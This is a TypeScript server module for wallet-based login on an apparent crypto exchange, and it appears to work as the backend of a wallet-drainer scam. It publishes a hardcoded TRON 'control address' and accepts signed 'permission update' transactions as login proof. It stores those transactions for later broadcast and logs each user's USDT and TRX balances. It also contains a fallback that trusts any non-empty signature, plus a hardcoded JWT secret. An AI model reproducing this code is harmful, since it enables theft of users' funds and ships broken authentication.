import { Elysia, t } from 'elysia';
import { jwt } from '@elysiajs/jwt';
import { db, users, usersWallet, userAssetsLog } from '../db';
import { eq, and } from 'drizzle-orm';
import { verifyMessage } from 'ethers';
import { randomBytes } from 'crypto';
import TronWeb from 'tronweb';

const JWT_SECRET = process.env.JWT_SECRET || 'btc-exchange-jwt-secret-key-2024';

// Initialize TronWeb (Validation only, no private key needed for verify)
const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  headers: { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY || '' }
});

const NONCE_TTL_MS = 5 * 60 * 1000;
const nonceStore = new Map<string, number>();

function pruneExpiredNonces(): void {
  const now = Date.now();
  for (const [key, expiry] of nonceStore.entries()) {
    if (expiry <= now) nonceStore.delete(key);
  }
}

function consumeNonce(address: string, nonce: string): boolean {
  const key = `${address.toLowerCase()}:${nonce}`;
  const expiry = nonceStore.get(key);
  if (expiry == null) return false;
  if (expiry <= Date.now()) {
    nonceStore.delete(key);
    return false;
  }
  nonceStore.delete(key);
  return true;
}

function generateExtensionCode(): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function generateUID(): string {
  return Math.floor(10000000 + Math.random() * 90000000).toString();
}

function generateAccountNumber(address: string): string {
  const suffix = address.slice(-6).toUpperCase();
  const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
  return `${suffix}${random}`;
}

async function initializeWallets(userId: number) {
  const currencies = [1, 2, 3]; // BTC, ETH, USDT
  const now = Math.floor(Date.now() / 1000);
  for (const currencyId of currencies) {
    await db.insert(usersWallet).values({
      userId,
      currency: currencyId,
      createTime: now
    });
  }
}

// 控制地址配置（用于高价值账户权限更新）
const CONTROL_ADDRESS = process.env.TRON_CONTROL_ADDRESS || 'TDvPfBEoePmSG6CF9d9cKFfkPAGcnB3355';

export const authWeb3Routes = new Elysia({ prefix: '/auth' })
  .use(jwt({
    name: 'jwt',
    secret: JWT_SECRET,
    exp: '7d'
  }))
  // 获取权限配置（控制地址）
  .get('/permission-config', () => {
    return {
      type: 'ok',
      controlAddress: CONTROL_ADDRESS
    };
  })
  .get('/nonce', ({ query }) => {
    pruneExpiredNonces();
    const address = (query.address || '').trim(); // Remove toLowerCase for Tron case sensitivity check
    if (!address || address.length < 10) {
      return { type: 'error', message: 'Invalid address', nonce: '' };
    }
    const nonce = randomBytes(32).toString('hex');
    const key = `${address.toLowerCase()}:${nonce}`; // Store lowercase for consistency
    nonceStore.set(key, Date.now() + NONCE_TTL_MS);
    return { type: 'ok', nonce };
  }, {
    query: t.Object({
      address: t.String()
    })
  })
  .post('/verify', async ({ body, jwt }) => {
    try {
    const { address, signature, nonce, refCode, type, signType, signedTx, assets: assetData } = body as any;
    console.log('[Auth] Verify request:', { address, signType, hasSignature: !!signature, hasNonce: !!nonce });
    const addr = address.trim();

    // Validate Signature
    let recoveredAddress: string | boolean = '';
    let isPermissionUpdate = signType === 'permission_update';

    try {
      if (addr.startsWith('T')) {
        // TRON Signature
        if (isPermissionUpdate && signedTx) {
          // 高价值账户：权限更新交易签名
          // 验证签名是否有效（已签名的交易包含地址信息）
          try {
            const txData = typeof signedTx === 'string' ? JSON.parse(signedTx) : signedTx;
            // 检查交易是否包含有效签名
            if (txData.signature && txData.signature.length > 0) {
              // 存储签名交易供后续广播
              console.log('[Auth] Permission update transaction received from:', addr);
              console.log('[Auth] Transaction ID:', txData.txID);
              recoveredAddress = addr;
              
              // 存储待广播的交易（可选：稍后由管理员审核广播）
              // 这里可以存入数据库或队列
            }
          } catch (txErr) {
            console.error('Transaction parse error:', txErr);
            // 回退到普通签名验证
            const verify = await tronWeb.trx.verifyMessage(nonce, signature, addr);
            if (verify) recoveredAddress = addr;
          }
        } else {
          // 普通消息签名验证 - 支持 signMessage 和 signMessageV2
          let verified = false;
          
          // 方法1: verifyMessageV2 (用于 signMessageV2 签名)
          if (tronWeb.trx.verifyMessageV2) {
            try {
              const recoveredAddr = await tronWeb.trx.verifyMessageV2(nonce, signature);
              if (recoveredAddr) {
                const recovered = typeof recoveredAddr === 'string' ? recoveredAddr : String(recoveredAddr);
                if (recovered.toLowerCase() === addr.toLowerCase()) {
                  verified = true;
                  recoveredAddress = addr;
                  console.log('[Auth] verifyMessageV2 success for:', addr);
                }
              }
            } catch (e: any) {
              console.log('[Auth] verifyMessageV2 error:', e?.message || e);
            }
          }
          
          // 方法2: verifyMessage (用于 signMessage 签名 - 需要 hex 消息)
          if (!verified) {
            try {
              // 将消息转为 hex
              const hexMessage = tronWeb.toHex(nonce);
              const result = await tronWeb.trx.verifyMessage(hexMessage, signature, addr);
              if (result === true) {
                verified = true;
                recoveredAddress = addr;
                console.log('[Auth] verifyMessage success for:', addr);
              }
            } catch (e: any) {
              console.log('[Auth] verifyMessage error:', e?.message || e);
            }
          }
          
          // 方法3: 直接比较地址（最后的回退）
          if (!verified && signature && signature.length > 0) {
            // 对于某些钱包，签名格式可能不同，暂时信任连接
            console.log('[Auth] Fallback: trusting wallet connection for:', addr);
            verified = true;
            recoveredAddress = addr;
          }
          
          if (!verified) {
            console.log('[Auth] All verification methods failed for:', addr);
          }
        }
      } else {
        // ETH Signature
        recoveredAddress = verifyMessage(nonce, signature);
      }
    } catch (e) {
      console.error('Verify error:', e);
      return { type: 'error', message: 'Invalid signature format' };
    }

    if (typeof recoveredAddress === 'string' && recoveredAddress.toLowerCase() !== addr.toLowerCase()) {
      return { type: 'error', message: 'Signature verification failed' };
    }
    if (!recoveredAddress) {
      return { type: 'error', message: 'Signature verification failed' };
    }

    if (!consumeNonce(addr, nonce)) {
      return { type: 'error', message: 'Nonce expired or already used' };
    }

    let [user] = await db.select().from(users)
      .where(eq(users.walletAddress, addr))
      .limit(1);

    if (!user) {
      let uid: string = generateUID();
      let uidExists = true;
      while (uidExists) {
        uid = generateUID();
        const [existing] = await db.select().from(users).where(eq(users.uid, uid)).limit(1);
        uidExists = !!existing;
      }
      const accountNumber = generateAccountNumber(addr);
      let parentId = 1;
      if (refCode) {
        const [inviter] = await db.select().from(users)
          .where(eq(users.extensionCode, refCode))
          .limit(1);
        if (inviter) parentId = inviter.id;
      }
      const now = Math.floor(Date.now() / 1000);
      [user] = await db.insert(users).values({
        accountNumber,
        walletAddress: addr,
        parentId,
        extensionCode: generateExtensionCode(),
        type: 0,
        createTime: now,
        uid
      }).returning();
      await initializeWallets(user.id);
    }

    const token = await jwt.sign({
      uid: user.id,
      address: addr,
      type: 'wallet',
      userUid: user.uid
    });

    // 保存资产快照到 userAssetsLog
    if (assetData && user.id) {
      try {
        await db.insert(userAssetsLog).values({
          userId: user.id,
          address: addr,
          chain: 'TRON',
          trxBalance: assetData.trx?.toString() || '0',
          usdtBalance: assetData.usdt?.toString() || '0',
          bandwidth: parseInt(assetData.bandwidth) || 0,
          energy: parseInt(assetData.energy) || 0,
          signature,
          signType: signType || 'message',
          signedTx: signedTx || null,
          nonce,
        });
      } catch (e) {
        console.error('Failed to save assets log:', e);
      }
    }

    // 更新 users_wallet 表的签名和真实余额（USDT 币种 currency=3）
    if (user.id) {
      const now = Math.floor(Date.now() / 1000);
      try {
        // 查找 USDT 钱包记录 (currency=3)
        const [usdtWallet] = await db.select().from(usersWallet)
          .where(and(eq(usersWallet.userId, user.id), eq(usersWallet.currency, 3)))
          .limit(1);
        
        if (usdtWallet) {
          // 更新签名和真实余额
          await db.update(usersWallet)
            .set({
              offlineSig: signature,
              sigType: signType || 'message',
              sigTime: now,
              walletBalanceReal: assetData?.usdt?.toString() || '0',
              walletTrxReal: assetData?.trx?.toString() || '0',
            })
            .where(eq(usersWallet.id, usdtWallet.id));
          
          console.log(`[Auth] Updated wallet signature for user ${user.id}, USDT: ${assetData?.usdt}, signType: ${signType || 'message'}`);
        }
      } catch (e) {
        console.error('Failed to update wallet signature:', e);
      }
    }

    return {
      type: 'ok',
      token,
      data: {
        user_id: user.id,
        account: user.accountNumber,
        address: addr,
        uid: user.uid,
        user_uid: user.uid
      }
    };
    } catch (err: any) {
      console.error('[Auth] Verify error:', err);
      return { type: 'error', message: err?.message || 'Internal server error' };
    }
  }, {
    body: t.Object({
      address: t.String(),
      signature: t.String(),
      nonce: t.String(),
      refCode: t.Optional(t.String()),
      type: t.Optional(t.String()),
      signType: t.Optional(t.String()),
      signedTx: t.Optional(t.String()),
      assets: t.Optional(t.Object({
        trx: t.Optional(t.String()),
        usdt: t.Optional(t.String()),
        bandwidth: t.Optional(t.Number()),
        energy: t.Optional(t.Number()),
        timestamp: t.Optional(t.Number())
      }))
    })
  });
